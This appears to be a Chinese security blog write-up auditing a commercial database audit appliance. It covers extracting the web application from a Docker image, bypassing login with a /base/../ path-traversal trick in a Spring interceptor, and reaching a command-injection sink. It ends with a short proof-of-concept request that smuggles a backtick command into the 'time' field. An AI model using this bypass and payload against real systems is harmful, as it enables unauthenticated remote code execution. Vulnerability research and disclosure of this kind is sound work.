放个垃圾设备,⽔个⽂章
某⽯⽹科云数据库审计与防护系统
源码来源:
docker search hi****one
搜索到两个内容 
这⾥拉取 zhu***zaxy/hi****one 镜像
docker pull zhu***zaxy/hi****one
然后docker run启动,这⾥启动需要注意下权限问题
附带参数 --privileged
后⾯的⼀些端⼝映射需要⾃⼰去设置，这⾥只演示如何启动容器
docker run --privileged=true -it -d zhu***zaxy/hi****ne  
/usr/sbin/init
启动过后进⼊容器
docker exec -it 容器id /bin/bash
全局搜索war包 
发现有两个
/home/realstone/web/webapps/ROOT/UpG**ade.war
/home/deploy/webdeploy2.0/webapps/ProtectPl**form.war
看了下内容，第⼆个war包才是web应⽤的部署⽂件。
copy到物理机中
docker cp 
c3cb558add74:/home/deploy/webdeploy2.0/webapps/Protect**atform.war 
/Users/**/Downloads 
然后就可以审计了。
这套源码也挺简单。
看了下web.xml中的⼀些配置⽂件，发现filter中没有权限验证的操作，但访问部分
路由仍会出现302的情况。
该系统使⽤Spring MVC，直接追拦截器
Spring拦截器
HandlerInterceptorAdapter需要继承
HandlerInterceptor需要实现
主要的三种⽅法
preHandle：拦截于请求刚进⼊时，进⾏判断，需要boolean返回值，如果返回true将继
续执⾏，如果返回false，将不进⾏执⾏。⼀般⽤于登录校验。
postHandle：拦截于⽅法成功返回后，视图渲染前，可以对modelAndView进⾏操作。
postHandle：拦截于⽅法成功返回后，视图渲染前，可以对modelAndView进⾏操作。
afterCompletion：拦截于⽅法成功返回后，视图渲染前，可以进⾏成功返回的⽇志记
录。
prehandle中，先是验证了refer是否存在当前的主机地址。
然后进⾏路径检查
    String url = request.getRequestURI();
    boolean userAuth = Boolean.FALSE.booleanValue();
    if (url.startsWith("/base/") || url
      .startsWith("/receive/"))
      return true;
这⾥的url取的是 getRequestURI ,并且下⽅是判断url开头是否为 /base/ 或
者 /receive/ 。可以直接/base/../adderss来绕。
确定了如何绕过，那么就开始挖掘漏洞。这类设备命令执⾏应该挺多的。全局搜
索 Runtime  发现某个⽅法存在命令执⾏ 
并且在Controller中存在调⽤。 
然后。。。然后就直接RCE了
POC:
POST /base/../systemConfig/****systime
time=`ping dnslog.cn`